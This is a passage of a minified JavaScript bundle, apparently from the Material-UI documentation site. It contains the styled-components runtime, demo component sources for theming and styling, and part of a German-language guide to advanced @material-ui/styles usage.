r)t[o]=[r[o][0]];return e(n,t)},css:a,getIds:se(r),hasNameForId:X(s),insertMarker:o,insertRules:function(e,n,t){o(e)[0]+=n.join(" "),Y(s,e,t)},removeRules:function(e){var n=r[e];void 0!==n&&(n[0]="",_(s,e))},sealed:!1,styleTag:null,toElement:te(a,s),toHTML:ne(a,s)}},ae=function(e,n,t,s,r){if(O&&!t){var o=function(e,n,t){var s=document.createElement("style");s.setAttribute(N,""),s.setAttribute("data-styled-version","4.3.2");var r=G();if(r&&s.setAttribute("nonce",r),s.appendChild(document.createTextNode("")),e&&!n)e.appendChild(s);else{if(!n||!e||!n.parentNode)throw new A(6);n.parentNode.insertBefore(s,t?n:n.nextSibling)}return s}(e,n,s);return M?function(e,n){var t=Object.create(null),s=Object.create(null),r=void 0!==n,o=!1,a=function(n){var r=s[n];return void 0!==r?r:(s[n]=re(n),e.appendChild(s[n]),t[n]=Object.create(null),s[n])},i=function(){var e="";for(var n in s)e+=s[n].data;return e};return{clone:function(){throw new A(5)},css:i,getIds:se(s),hasNameForId:X(t),insertMarker:a,insertRules:function(e,s,i){for(var l=a(e),c=[],d=s.length,u=0;u<d;u+=1){var m=s[u],p=r;if(p&&-1!==m.indexOf("@import"))c.push(m);else{p=!1;var h=u===d-1?"":" ";l.appendData(""+m+h)}}Y(t,e,i),r&&c.length>0&&(o=!0,n().insertRules(e+"-import",c))},removeRules:function(a){var i=s[a];if(void 0!==i){var l=re(a);e.replaceChild(l,i),s[a]=l,_(t,a),r&&o&&n().removeRules(a+"-import")}},sealed:!1,styleTag:e,toElement:te(i,t),toHTML:ne(i,t)}}(o,r):function(e,n){var t=Object.create(null),s=Object.create(null),r=[],o=void 0!==n,a=!1,i=function(e){var n=s[e];return void 0!==n?n:(s[e]=r.length,r.push(0),_(t,e),s[e])},l=function(){var n=K(e).cssRules,t="";for(var o in s){t+=Q(o);for(var a=s[o],i=ee(r,a),l=i-r[a];l<i;l+=1){var c=n[l];void 0!==c&&(t+=c.cssText)}}return t};return{clone:function(){throw new A(5)},css:l,getIds:se(s),hasNameForId:X(t),insertMarker:i,insertRules:function(s,l,c){for(var d=i(s),u=K(e),m=ee(r,d),p=0,h=[],f=l.length,g=0;g<f;g+=1){var y=l[g],b=o;b&&-1!==y.indexOf("@import")?h.push(y):Z(u,y,m+p)&&(b=!1,p+=1)}o&&h.length>0&&(a=!0,n().insertRules(s+"-import",h)),r[d]+=p,Y(t,s,c)},removeRules:function(i){var l=s[i];if(void 0!==l){var c=r[l];!function(e,n,t){for(var s=n-t,r=n;r>s;r-=1)e.deleteRule(r)}(K(e),ee(r,l)-1,c),r[l]=0,_(t,i),o&&a&&n().removeRules(i+"-import")}},sealed:!1,styleTag:e,toElement:te(l,t),toHTML:ne(l,t)}}(o,r)}return oe()},ie=/\s+/,le=void 0;le=O?M?40:1e3:-1;var ce=0,de=void 0,ue=function(){function e(){var n=this,t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:O?document.head:null,s=arguments.length>1&&void 0!==arguments[1]&&arguments[1];g(this,e),this.getImportRuleTag=function(){var e=n.importRuleTag;if(void 0!==e)return e;var t=n.tags[0];return n.importRuleTag=ae(n.target,t?t.styleTag:null,n.forceServer,!0)},ce+=1,this.id=ce,this.forceServer=s,this.target=s?null:t,this.tagMap={},this.deferred={},this.rehydratedNames={},this.ignoreRehydratedNames={},this.tags=[],this.capacity=1,this.clones=[]}return e.prototype.rehydrate=function(){if(!O||this.forceServer)return this;var e=[],n=[],t=!1,s=document.querySelectorAll("style["+N+'][data-styled-version="4.3.2"]'),r=s.length;if(!r)return this;for(var o=0;o<r;o+=1){var a=s[o];t||(t=!!a.getAttribute("data-styled-streamed"));for(var i,l=(a.getAttribute(N)||"").trim().split(ie),c=l.length,d=0;d<c;d+=1)i=l[d],this.rehydratedNames[i]=!0;n.push.apply(n,D(a.textContent)),e.push(a)}var u=n.length;if(!u)return this;var m=this.makeTag(null);!function(e,n,t){for(var s=0,r=t.length;s<r;s+=1){var o=t[s],a=o.componentId,i=o.cssFromDOM,l=q(i);e.insertRules(a,l)}for(var c=0,d=n.length;c<d;c+=1){var u=n[c];u.parentNode&&u.parentNode.removeChild(u)}}(m,e,n),this.capacity=Math.max(1,le-u),this.tags.push(m);for(var p=0;p<u;p+=1)this.tagMap[n[p].componentId]=m;return this},e.reset=function(){var n=arguments.length>0&&void 0!==arguments[0]&&arguments[0];de=new e(void 0,n).rehydrate()},e.prototype.clone=function(){var n=new e(this.target,this.forceServer);return this.clones.push(n),n.tags=this.tags.map(function(e){for(var t=e.getIds(),s=e.clone(),r=0;r<t.length;r+=1)n.tagMap[t[r]]=s;return s}),n.rehydratedNames=b({},this.rehydratedNames),n.deferred=b({},this.deferred),n},e.prototype.sealAllTags=function(){this.capacity=1,this.tags.forEach(function(e){e.sealed=!0})},e.prototype.makeTag=function(e){var n=e?e.styleTag:null;return ae(this.target,n,this.forceServer,!1,this.getImportRuleTag)},e.prototype.getTagForId=function(e){var n=this.tagMap[e];if(void 0!==n&&!n.sealed)return n;var t=this.tags[this.tags.length-1];return this.capacity-=1,0===this.capacity&&(this.capacity=le,t=this.makeTag(t),this.tags.push(t)),this.tagMap[e]=t},e.prototype.hasId=function(e){return void 0!==this.tagMap[e]},e.prototype.hasNameForId=function(e,n){if(void 0===this.ignoreRehydratedNames[e]&&this.rehydratedNames[n])return!0;var t=this.tagMap[e];return void 0!==t&&t.hasNameForId(e,n)},e.prototype.deferredInject=function(e,n){if(void 0===this.tagMap[e]){for(var t=this.clones,s=0;s<t.length;s+=1)t[s].deferredInject(e,n);this.getTagForId(e).insertMarker(e),this.deferred[e]=n}},e.prototype.inject=function(e,n,t){for(var s=this.clones,r=0;r<s.length;r+=1)s[r].inject(e,n,t);var o=this.getTagForId(e);if(void 0!==this.deferred[e]){var a=this.deferred[e].concat(n);o.insertRules(e,a,t),this.deferred[e]=void 0}else o.insertRules(e,n,t)},e.prototype.remove=function(e){var n=this.tagMap[e];if(void 0!==n){for(var t=this.clones,s=0;s<t.length;s+=1)t[s].remove(e);n.removeRules(e),this.ignoreRehydratedNames[e]=!0,this.deferred[e]=void 0}},e.prototype.toHTML=function(){return this.tags.map(function(e){return e.toHTML()}).join("")},e.prototype.toReactElements=function(){var e=this.id;return this.tags.map(function(n,t){var s="sc-"+e+"-"+t;return Object(i.cloneElement)(n.toElement(),{key:s})})},y(e,null,[{key:"master",get:function(){return de||(de=(new e).rehydrate())}},{key:"instance",get:function(){return e.master}}]),e}(),me=function(){function e(n,t){var s=this;g(this,e),this.inject=function(e){e.hasNameForId(s.id,s.name)||e.inject(s.id,s.rules,s.name)},this.toString=function(){throw new A(12,String(s.name))},this.name=n,this.rules=t,this.id="sc-keyframes-"+n}return e.prototype.getName=function(){return this.name},e}(),pe=/([A-Z])/g,he=/^ms-/;function fe(e){return e.replace(pe,"-$1").toLowerCase().replace(he,"-ms-")}var ge=function(e){return null==e||!1===e||""===e},ye=function e(n,t){var s=[];return Object.keys(n).forEach(function(t){if(!ge(n[t])){if(w(n[t]))return s.push.apply(s,e(n[t],t)),s;if(T(n[t]))return s.push(fe(t)+":",n[t],";"),s;s.push(fe(t)+": "+(r=t,null==(o=n[t])||"boolean"==typeof o||""===o?"":"number"!=typeof o||0===o||r in c.a?String(o).trim():o+"px")+";")}var r,o;return s}),t?[t+" {"].concat(s,["}"]):s};function be(e,n,t){if(Array.isArray(e)){for(var s,r=[],o=0,a=e.length;o<a;o+=1)null!==(s=be(e[o],n,t))&&(Array.isArray(s)?r.push.apply(r,s):r.push(s));return r}return ge(e)?null:k(e)?"."+e.styledComponentId:T(e)?"function"!=typeof(i=e)||i.prototype&&i.prototype.isReactComponent||!n?e:be(e(n),n,t):e instanceof me?t?(e.inject(t),e.getName()):e:w(e)?ye(e):e.toString();var i}function ve(e){for(var n=arguments.length,t=Array(n>1?n-1:0),s=1;s<n;s++)t[s-1]=arguments[s];return T(e)||w(e)?be(h(x,[e].concat(t))):be(h(e,t))}function Se(e){for(var n,t=0|e.length,s=0|t,r=0;t>=4;)n=1540483477*(65535&(n=255&e.charCodeAt(r)|(255&e.charCodeAt(++r))<<8|(255&e.charCodeAt(++r))<<16|(255&e.charCodeAt(++r))<<24))+((1540483477*(n>>>16)&65535)<<16),s=1540483477*(65535&s)+((1540483477*(s>>>16)&65535)<<16)^(n=1540483477*(65535&(n^=n>>>24))+((1540483477*(n>>>16)&65535)<<16)),t-=4,++r;switch(t){case 3:s^=(255&e.charCodeAt(r+2))<<16;case 2:s^=(255&e.charCodeAt(r+1))<<8;case 1:s=1540483477*(65535&(s^=255&e.charCodeAt(r)))+((1540483477*(s>>>16)&65535)<<16)}return((s=1540483477*(65535&(s^=s>>>13))+((1540483477*(s>>>16)&65535)<<16))^s>>>15)>>>0}var je=52,we=function(e){return String.fromCharCode(e+(e>25?39:97))};function xe(e){var n="",t=void 0;for(t=e;t>je;t=Math.floor(t/je))n=we(t%je)+n;return we(t%je)+n}function Pe(e,n){for(var t=0;t<e.length;t+=1){var s=e[t];if(Array.isArray(s)&&!Pe(s,n))return!1;if(T(s)&&!k(s))return!1}return!n.some(function(e){return T(e)||function(e){for(var n in e)if(T(e[n]))return!0;return!1}(e)})}var Te,Ce=!1,ke=function(e){return xe(Se(e))},Ne=function(){function e(n,t,s){g(this,e),this.rules=n,this.isStatic=!Ce&&Pe(n,t),this.componentId=s,ue.master.hasId(s)||ue.master.deferredInject(s,[])}return e.prototype.generateAndInjectStyles=function(e,n){var t=this.isStatic,s=this.componentId,r=this.lastClassName;if(O&&t&&"string"==typeof r&&n.hasNameForId(s,r))return r;var o=be(this.rules,e,n),a=ke(this.componentId+o.join(""));return n.hasNameForId(s,a)||n.inject(this.componentId,U(o,"."+a,void 0,s),a),this.lastClassName=a,a},e.generateName=function(e){return ke(e)},e}(),Oe=function(e,n){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:P,s=!!t&&e.theme===t.theme,r=e.theme&&!s?e.theme:n||t.theme;return r},Me=/[[\].#*$><+~=|^:(),"'`-]+/g,Ae=/(^-|-$)/g;function Ie(e){return e.replace(Me,"-").replace(Ae,"")}function De(e){return"string"==typeof e&&!0}var Ee={childContextTypes:!0,contextTypes:!0,defaultProps:!0,displayName:!0,getDerivedStateFromProps:!0,propTypes:!0,type:!0},Re={name:!0,length:!0,prototype:!0,caller:!0,callee:!0,arguments:!0,arity:!0},Be=((Te={})[d.ForwardRef]={$$typeof:!0,render:!0},Te),Fe=Object.defineProperty,He=Object.getOwnPropertyNames,ze=Object.getOwnPropertySymbols,$e=void 0===ze?function(){return[]}:ze,We=Object.getOwnPropertyDescriptor,Le=Object.getPrototypeOf,Je=Object.prototype,qe=Array.prototype;function Ue(e,n,t){if("string"!=typeof n){var s=Le(n);s&&s!==Je&&Ue(e,s,t);for(var r=qe.concat(He(n),$e(n)),o=Be[e.$$typeof]||Ee,a=Be[n.$$typeof]||Ee,i=r.length,l=void 0,c=void 0;i--;)if(c=r[i],!(Re[c]||t&&t[c]||a&&a[c]||o&&o[c])&&(l=We(n,c)))try{Fe(e,c,l)}catch(d){}return e}return e}var Ge=Object(i.createContext)(),Ye=Ge.Consumer,_e=function(e){function n(t){g(this,n);var s=j(this,e.call(this,t));return s.getContext=Object(u.a)(s.getContext.bind(s)),s.renderInner=s.renderInner.bind(s),s}return v(n,e),n.prototype.render=function(){return this.props.children?l.a.createElement(Ge.Consumer,null,this.renderInner):null},n.prototype.renderInner=function(e){var n=this.getContext(this.props.theme,e);return l.a.createElement(Ge.Provider,{value:n},l.a.Children.only(this.props.children))},n.prototype.getTheme=function(e,n){if(T(e))return e(n);if(null===e||Array.isArray(e)||"object"!==(void 0===e?"undefined":f(e)))throw new A(8);return b({},n,e)},n.prototype.getContext=function(e,n){return this.getTheme(e,n)},n}(i.Component),Xe=(function(){function e(){g(this,e),this.masterSheet=ue.master,this.instance=this.masterSheet.clone(),this.sealed=!1}e.prototype.seal=function(){if(!this.sealed){var e=this.masterSheet.clones.indexOf(this.instance);this.masterSheet.clones.splice(e,1),this.sealed=!0}},e.prototype.collectStyles=function(e){if(this.sealed)throw new A(2);return l.a.createElement(Ke,{sheet:this.instance},e)},e.prototype.getStyleTags=function(){return this.seal(),this.instance.toHTML()},e.prototype.getStyleElement=function(){return this.seal(),this.instance.toReactElements()},e.prototype.interleaveWithNodeStream=function(e){throw new A(3)}}(),Object(i.createContext)()),Ve=Xe.Consumer,Ke=function(e){function n(t){g(this,n);var s=j(this,e.call(this,t));return s.getContext=Object(u.a)(s.getContext),s}return v(n,e),n.prototype.getContext=function(e,n){if(e)return e;if(n)return new ue(n);throw new A(4)},n.prototype.render=function(){var e=this.props,n=e.children,t=e.sheet,s=e.target;return l.a.createElement(Xe.Provider,{value:this.getContext(t,s)},n)},n}(i.Component),Ze={};var Qe=function(e){function n(){g(this,n);var t=j(this,e.call(this));return t.attrs={},t.renderOuter=t.renderOuter.bind(t),t.renderInner=t.renderInner.bind(t),t}return v(n,e),n.prototype.render=function(){return l.a.createElement(Ve,null,this.renderOuter)},n.prototype.renderOuter=function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:ue.master;return this.styleSheet=e,this.props.forwardedComponent.componentStyle.isStatic?this.renderInner():l.a.createElement(Ye,null,this.renderInner)},n.prototype.renderInner=function(e){var n=this.props.forwardedComponent,t=n.componentStyle,s=n.defaultProps,r=(n.displayName,n.foldedComponentIds),o=n.styledComponentId,a=n.target,l=void 0;l=t.isStatic?this.generateAndInjectStyles(P,this.props):this.generateAndInjectStyles(Oe(this.props,e,s)||P,this.props);var c=this.props.as||this.attrs.as||a,d=De(c),u={},p=b({},this.attrs,this.props),h=void 0;for(h in p)"forwardedComponent"!==h&&"as"!==h&&("forwardedRef"===h?u.ref=p[h]:"forwardedAs"===h?u.as=p[h]:d&&!Object(m.a)(h)||(u[h]=p[h]));return this.props.style&&this.attrs.style&&(u.style=b({},this.attrs.style,this.props.style)),u.className=Array.prototype.concat(r,this.props.className,o,this.attrs.className,l).filter(Boolean).join(" "),Object(i.createElement)(c,u)},n.prototype.buildExecutionContext=function(e,n,t){var s=this,r=b({},n,{theme:e});return t.length?(this.attrs={},t.forEach(function(e){var n,t=e,o=!1,a=void 0,i=void 0;for(i in T(t)&&(t=t(r),o=!0),t)a=t[i],o||!T(a)||(n=a)&&n.prototype&&n.prototype.isReactComponent||k(a)||(a=a(r)),s.attrs[i]=a,r[i]=a}),r):r},n.prototype.generateAndInjectStyles=function(e,n){var t=n.forwardedComponent,s=t.attrs,r=t.componentStyle;t.warnTooManyClasses;return r.isStatic&&!s.length?r.generateAndInjectStyles(P,this.styleSheet):r.generateAndInjectStyles(this.buildExecutionContext(e,n,s),this.styleSheet)},n}(i.Component);function en(e,n,t){var s=k(e),r=!De(e),o=n.displayName,a=void 0===o?function(e){return De(e)?"styled."+e:"Styled("+C(e)+")"}(e):o,i=n.componentId,c=void 0===i?function(e,n,t){var s="string"!=typeof n?"sc":Ie(n),r=(Ze[s]||0)+1;Ze[s]=r;var o=s+"-"+e.generateName(s+r);return t?t+"-"+o:o}(Ne,n.displayName,n.parentComponentId):i,d=n.ParentComponent,u=void 0===d?Qe:d,m=n.attrs,h=void 0===m?x:m,f=n.displayName&&n.componentId?Ie(n.displayName)+"-"+n.componentId:n.componentId||c,g=s&&e.attrs?Array.prototype.concat(e.attrs,h).filter(Boolean):h,y=new Ne(s?e.componentStyle.rules.concat(t):t,g,f),v=void 0,j=function(e,n){return l.a.createElement(u,b({},e,{forwardedComponent:v,forwardedRef:n}))};return j.displayName=a,(v=l.a.forwardRef(j)).displayName=a,v.attrs=g,v.componentStyle=y,v.foldedComponentIds=s?Array.prototype.concat(e.foldedComponentIds,e.styledComponentId):x,v.styledComponentId=f,v.target=s?e.target:e,v.withComponent=function(e){var s=n.componentId,r=S(n,["componentId"]),o=s&&s+"-"+(De(e)?e:Ie(C(e)));return en(e,b({},r,{attrs:g,componentId:o,ParentComponent:u}),t)},Object.defineProperty(v,"defaultProps",{get:function(){return this._foldedDefaultProps},set:function(n){this._foldedDefaultProps=s?Object(p.a)(e.defaultProps,n):n}}),v.toString=function(){return"."+v.styledComponentId},r&&Ue(v,e,{attrs:!0,componentStyle:!0,displayName:!0,foldedComponentIds:!0,styledComponentId:!0,target:!0,withComponent:!0}),v}var nn=function(e){return function e(n,t){var s=arguments.length>2&&void 0!==arguments[2]?arguments[2]:P;if(!Object(d.isValidElementType)(t))throw new A(1,String(t));var r=function(){return n(t,s,ve.apply(void 0,arguments))};return r.withConfig=function(r){return e(n,t,b({},s,r))},r.attrs=function(r){return e(n,t,b({},s,{attrs:Array.prototype.concat(s.attrs,r).filter(Boolean)}))},r}(en,e)};["a","abbr","address","area","article","aside","audio","b","base","bdi","bdo","big","blockquote","body","br","button","canvas","caption","cite","code","col","colgroup","data","datalist","dd","del","details","dfn","dialog","div","dl","dt","em","embed","fieldset","figcaption","figure","footer","form","h1","h2","h3","h4","h5","h6","head","header","hgroup","hr","html","i","iframe","img","input","ins","kbd","keygen","label","legend","li","link","main","map","mark","marquee","menu","menuitem","meta","meter","nav","noscript","object","ol","optgroup","option","output","p","param","picture","pre","progress","q","rp","rt","ruby","s","samp","script","section","select","small","source","span","strong","style","sub","summary","sup","table","tbody","td","textarea","tfoot","th","thead","time","title","tr","track","u","ul","var","video","wbr","circle","clipPath","defs","ellipse","foreignObject","g","image","line","linearGradient","marker","mask","path","pattern","polygon","polyline","radialGradient","rect","stop","svg","text","tspan"].forEach(function(e){nn[e]=nn(e)});!function(){function e(n,t){g(this,e),this.rules=n,this.componentId=t,this.isStatic=Pe(n,x),ue.master.hasId(t)||ue.master.deferredInject(t,[])}e.prototype.createStyles=function(e,n){var t=U(be(this.rules,e,n),"");n.inject(this.componentId,t)},e.prototype.removeStyles=function(e){var n=this.componentId;e.hasId(n)&&e.remove(n)},e.prototype.renderStyles=function(e,n){this.removeStyles(n),this.createStyles(e,n)}}();O&&(window.scCGSHMRCache={});n.b=nn}).call(this,t("5IsQ"))},Vt0F:function(e,n,t){var s=t("/6KZ");s(s.S+s.F*!t("lBnu"),"Object",{defineProperties:t("n6P+")})},W1Q1:function(e,n){e.exports="import React from 'react';\nimport styled from 'styled-components';\nimport { TextField, NoSsr } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.Mui-focused {\n    color: green;\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red;\n    }\n    &:hover fieldset {\n      border-color: yellow;\n    }\n    &.Mui-focused fieldset {\n      border-color: green;\n    }\n  }\n`;\n\nexport default function GlobalClassName() {\n  return (\n    <NoSsr>\n      <StyledTextField label=\"Deterministic\" variant=\"outlined\" id=\"deterministic-outlined-input\" />\n    </NoSsr>\n  );\n}\n"},WpNh:function(e,n,t){"use strict";function s(e,n){if(e.length!==n.length)return!1;for(var t=0;t<e.length;t++)if(e[t]!==n[t])return!1;return!0}n.a=function(e,n){var t;void 0===n&&(n=s);var r,o=[],a=!1;return function(){for(var s=arguments.length,i=new Array(s),l=0;l<s;l++)i[l]=arguments[l];return a&&t===this&&n(i,o)?r:(r=e.apply(this,i),a=!0,t=this,o=i,r)}}},YmTL:function(e,n,t){var s={"./GlobalClassName.js":"NLUw","./GlobalClassName.tsx":"1ZeO","./GlobalCss.js":"6c61","./GlobalCss.tsx":"jN+d","./HybridGlobalCss.js":"uQs/","./HybridGlobalCss.tsx":"TunK","./StringTemplates.js":"am8y","./ThemeNesting.js":"4Tsr","./ThemeNesting.tsx":"6iTa","./Theming.js":"K8BI","./Theming.tsx":"7HKs","./UseTheme.js":"qYY6","./UseTheme.tsx":"3Biu","./WithTheme.js":"big6","./WithTheme.tsx":"9SVr","./advanced-aa.md":"ewI0","./advanced-de.md":"dsqy","./advanced-es.md":"g5o9","./advanced-fr.md":"eRi8","./advanced-ja.md":"7BXB","./advanced-pt.md":"vrP6","./advanced-ru.md":"5OFl","./advanced-zh.md":"7GMC","./advanced.md":"21kb"};function r(e){var n=o(e);return t(n)}function o(e){var n=s[e];if(!(n+1)){var t=new Error("Cannot find module '"+e+"'");throw t.code="MODULE_NOT_FOUND",t}return n}r.keys=function(){return Object.keys(s)},r.resolve=o,e.exports=r,r.id="YmTL"},ZRWS:function(e,n,t){t("Vt0F");var s=t("TaGV").Object;e.exports=function(e,n){return s.defineProperties(e,n)}},Zxfz:function(e,n,t){"use strict";n.a={animationIterationCount:1,borderImageOutset:1,borderImageSlice:1,borderImageWidth:1,boxFlex:1,boxFlexGroup:1,boxOrdinalGroup:1,columnCount:1,columns:1,flex:1,flexGrow:1,flexPositive:1,flexShrink:1,flexNegative:1,flexOrder:1,gridRow:1,gridRowEnd:1,gridRowSpan:1,gridRowStart:1,gridColumn:1,gridColumnEnd:1,gridColumnSpan:1,gridColumnStart:1,msGridRow:1,msGridRowSpan:1,msGridColumn:1,msGridColumnSpan:1,fontWeight:1,lineHeight:1,opacity:1,order:1,orphans:1,tabSize:1,widows:1,zIndex:1,zoom:1,WebkitLineClamp:1,fillOpacity:1,floodOpacity:1,stopOpacity:1,strokeDasharray:1,strokeDashoffset:1,strokeMiterlimit:1,strokeOpacity:1,strokeWidth:1}},aUig:function(e,n){e.exports="import React from 'react';\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/styles';\n\nconst useStyles = makeStyles({\n  root: {\n    '&.root': {\n      height: 100,\n      width: 100,\n      backgroundColor: 'blue',\n    },\n    '& .child': {\n      height: 8,\n      backgroundColor: 'red',\n    },\n  },\n});\n\nexport default function HybridCss() {\n  const classes = useStyles();\n\n  return (\n    <div className={clsx(classes.root, 'root')}>\n      <div className=\"child\" />\n    </div>\n  );\n}\n"},am8y:function(e,n,t){"use strict";t.r(n);var s=t("0tNF"),r=t("mXGw"),o=t.n(r),a=t("+e5d"),i=t("3O2h"),l=t("IOrS"),c=t("iBBK"),d=/;\n/,u=function(e){"string"==typeof e.style&&(e.style=function(e){for(var n={},t=e.split(d),s=0;s<t.length;s++){var r=(t[s]||"").trim();if(r){var o=r.indexOf(":");if(-1!==o){var a=r.substr(0,o).trim(),i=r.substr(o+1).trim();n[a]=i}}}return n}(e.style))};var m=function(){return{onProcessRule:u}},p=Object(c.b)({plugins:[m()].concat(Object(s.default)(Object(a.a)().plugins))}),h=Object(i.a)({root:"\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  "});var f=o.a.createElement(l.b,{jss:p},o.a.createElement(function(){var e=h();return o.a.createElement("button",{type:"button",className:e.root},"String templates")},null));n.default=function(){return f}},big6:function(e,n,t){"use strict";t.r(n);var s=t("mXGw"),r=t.n(s),o=t("005G"),a=t("h7Hf");var i=Object(o.a)(function(e){return r.a.createElement("span",null,"spacing ".concat(e.theme.spacing))}),l=r.a.createElement(i,null);n.default=function(){return r.a.createElement(a.a,{theme:{spacing:"8px"}},l)}},djDG:function(e,n,t){"use strict";var s=t("z3IF"),r=t("Rbzu"),o=t("2Fjn"),a=t("mXGw"),i=t.n(a),l=t("PDtE"),c=t("c3Nm"),d=t("XpU0"),u=i.a.forwardRef(function(e,n){var t=e.disableUnderline,a=e.classes,d=e.fullWidth,u=void 0!==d&&d,m=e.inputComponent,p=void 0===m?"input":m,h=e.multiline,f=void 0!==h&&h,g=e.type,y=void 0===g?"text":g,b=Object(o.a)(e,["disableUnderline","classes","fullWidth","inputComponent","multiline","type"]);return i.a.createElement(c.a,Object(s.default)({classes:Object(r.a)({},a,{root:Object(l.a)(a.root,!t&&a.underline),underline:null}),fullWidth:u,inputComponent:p,multiline:f,ref:n,type:y},b))});u.muiName="Input",n.a=Object(d.default)(function(e){var n="light"===e.palette.type,t=n?"rgba(0, 0, 0, 0.42)":"rgba(255, 255, 255, 0.7)",s=n?"rgba(0, 0, 0, 0.09)":"rgba(255, 255, 255, 0.09)";return{root:{position:"relative",backgroundColor:s,borderTopLeftRadius:e.shape.borderRadius,borderTopRightRadius:e.shape.borderRadius,transition:e.transitions.create("background-color",{duration:e.transitions.duration.shorter,easing:e.transitions.easing.easeOut}),"&:hover":{backgroundColor:n?"rgba(0, 0, 0, 0.13)":"rgba(255, 255, 255, 0.13)","@media (hover: none)":{backgroundColor:s}},"&$focused":{backgroundColor:n?"rgba(0, 0, 0, 0.09)":"rgba(255, 255, 255, 0.09)"},"&$disabled":{backgroundColor:n?"rgba(0, 0, 0, 0.12)":"rgba(255, 255, 255, 0.12)"}},underline:{"&:after":{borderBottom:"2px solid ".concat(e.palette.primary[n?"dark":"light"]),left:0,bottom:0,content:'""',position:"absolute",right:0,transform:"scaleX(0)",transition:e.transitions.create("transform",{duration:e.transitions.duration.shorter,easing:e.transitions.easing.easeOut}),pointerEvents:"none"},"&$focused:after":{transform:"scaleX(1)"},"&$error:after":{borderBottomColor:e.palette.error.main,transform:"scaleX(1)"},"&:before":{borderBottom:"1px solid ".concat(t),left:0,bottom:0,content:'"\\00a0"',position:"absolute",right:0,transition:e.transitions.create("border-bottom-color",{duration:e.transitions.duration.shorter}),pointerEvents:"none"},"&:hover:before":{borderBottom:"1px solid ".concat(e.palette.text.primary)},"&$disabled:before":{borderBottomStyle:"dotted"}},focused:{},disabled:{},adornedStart:{paddingLeft:12},adornedEnd:{paddingRight:12},error:{},marginDense:{},multiline:{padding:"27px 12px 10px","&$marginDense":{paddingTop:23,paddingBottom:6}},input:{padding:"27px 12px 10px"},inputMarginDense:{paddingTop:23,paddingBottom:6},inputHiddenLabel:{paddingTop:18,paddingBottom:19,"&$inputMarginDense":{paddingTop:10,paddingBottom:11}},inputSelect:{paddingRight:24},inputMultiline:{padding:0},inputAdornedStart:{paddingLeft:0},inputAdornedEnd:{paddingRight:0}}},{name:"MuiFilledInput"})(u)},dsqy:function(e,n){e.exports="# Erweitert\n\n<p class=\"description\">Diese Sektion behandelt mehr der fortgeschrittenen Nutzung von @material-ui/styles.</p>\n\n## Theming\n\nFügen Sie auf der oberste Ebene Ihrer App einen ` ThemeProvider` hinzu, um auf das Theme im Komponentenbaum von React zuzugreifen. Anschließend können Sie in den Stilfunktionen auf das Designobjekt zugreifen.\n\n```jsx\nimport { ThemeProvider } from '@material-ui/styles';\n\nconst theme = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nfunction Theming() {\n  return (\n    <ThemeProvider theme={theme}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/Theming.js\"}}\n\n### Zugriff auf das Theme in einer Komponente\n\nMöglicherweise müssen Sie auf die Themevariablen in Ihren React-Komponenten zugreifen.\n\n#### `useTheme` hook\n\n```jsx\nimport { useTheme } from '@material-ui/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/UseTheme.js\"}}\n\n#### `withTheme` HOC\n\n```jsx\nimport { withTheme } from '@material-ui/styles';\n\nfunction DeepChildRaw(props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nconst DeepChild = withTheme(DeepChildRaw);\n```\n\n{{\"demo\": \"pages/styles/advanced/WithTheme.js\"}}\n\n### Verschachtelung des Themes\n\nSie können mehrere Theme Provider verschachteln. Dies kann sehr nützlich sein, wenn Sie sich mit unterschiedlichen Bereichen Ihrer Anwendung befassen, die sich voneinander unterscheiden.\n\n```jsx\n<ThemeProvider theme={outerTheme}>\n  <Child1 />\n  <ThemeProvider theme={innerTheme}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n{{\"demo\": \"pages/styles/advanced/ThemeNesting.js\"}}\n\nDas innere Theme ** überschreibt** das äußere Theme. Sie können das äußere Theme erweitern, indem Sie eine Funktion bereitstellen:\n\n```jsx\n<ThemeProvider theme={…} >\n  <Child1 />\n  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n## Überschreiben der Styles `classes` Eigenschaft\n\nDie `makeStyle` (Hook-Generator) und `withStyles` (HOC) APIs ermöglichen die Erstellung mehrerer Stilregeln pro Stylesheet. Jede Stilregel hat einen eigenen Klassennamen. Die Klassennamen werden der Komponente mit der `classes` Variable zur Verfügung gestellt. Dies ist besonders nützlich, wenn Sie verschachtelte Elemente in einer Komponente formatieren.\n\n```jsx\n// Ein Stylesheet\nconst useStyles = makeStyles({\n  root: {}, // eine Stil Regel\n  label: {}, // eine verschachtelte Regel\n});\n\nfunction Nested(props) {\n  const classes = useStyles();\n  return (\n    <button className={classes.root}> // 'jss1'\n      <span className={classes.label}> // 'jss2'\n        verschachtelt\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested />\n}\n```\n\nDie Klassennamen sind jedoch häufig nicht deterministisch. Wie kann eine übergeordnete Komponente den Stil eines verschachtelten Elements überschreiben?\n\n### withStyles\n\nDies ist der einfachste Fall. Die umschlossene Komponente akzeptiert die `classes` Eigenschaft, welches einfach die mit dem Stylesheet gelieferten Klassennamen zusammengeführt wird.\n\n```jsx\nconst Nested = withStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n})(({ classes }) => (\n  <button className={classes.root}>\n    <span className={classes.label}> // 'jss2 my-label'\n      Nested\n    </span>\n  </button>\n));\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n### makeStyles\n\nDie Hook-API erfordert etwas mehr Arbeit. Sie müssen die übergeordneten 